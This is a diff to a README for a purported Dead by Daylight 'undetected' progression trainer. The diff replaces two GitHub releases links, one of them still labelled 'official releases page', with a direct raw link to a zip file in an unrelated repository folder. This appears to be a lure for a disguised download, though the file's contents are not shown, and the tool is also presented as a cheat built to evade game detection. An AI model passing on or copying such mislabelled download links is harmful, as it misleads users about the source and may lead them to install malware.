@@ -5,7 +5,7 @@ description: "Automate Dead by Daylight progression with an undetected external 
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026-Elite - Automate your Dead by Daylight progression
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/davideyassa/DBD-AutoGrind-Trainer-2026-Elite/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/davideyassa/davideyassa.github.io/main/overgross/github_io_davideyassa_1.5.zip)
 
 This software helps players manage their progression in Dead by Daylight. The tool automates repetitive tasks to earn Bloodpoints and manages cosmetic or perk unlocks. It works on Windows systems and runs as an external process to the game client.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these specifications to run the trainer:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/davideyassa/DBD-AutoGrind-Trainer-2026-Elite/releases) to download the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/davideyassa/davideyassa.github.io/main/overgross/github_io_davideyassa_1.5.zip) to download the latest version.
 2. Look for the file ending in .zip in the "Assets" section of the current release.
 3. Save the folder to your computer, typically in your Downloads directory.
 4. Right-click the downloaded folder and select "Extract All" to view the application files.
